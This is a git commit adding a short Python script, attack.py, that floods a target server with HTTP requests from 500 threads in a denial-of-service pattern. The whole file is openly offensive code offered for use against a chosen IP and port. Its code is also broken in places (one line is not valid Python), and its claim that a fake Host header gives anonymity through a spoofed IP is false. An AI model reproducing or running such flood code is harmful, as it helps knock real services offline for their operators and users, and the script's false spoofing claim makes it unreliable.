5d3ab75c2867b5c9a21aee0241b9669c791c8cae
cloudnine24 <iconickelvin@gmail.com>
2025-06-17 13:18:41 -0700

    Initial commit

---
+++ attack.py
@@ -0,0 +1,20 @@
+import threading
+import socket
+
+target = 'Input target server IP'
+port = input target port 
+fake_ip = 'input a spoofed IP for anonymity'
+
+already_connected = 0   # Counter for connections 
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
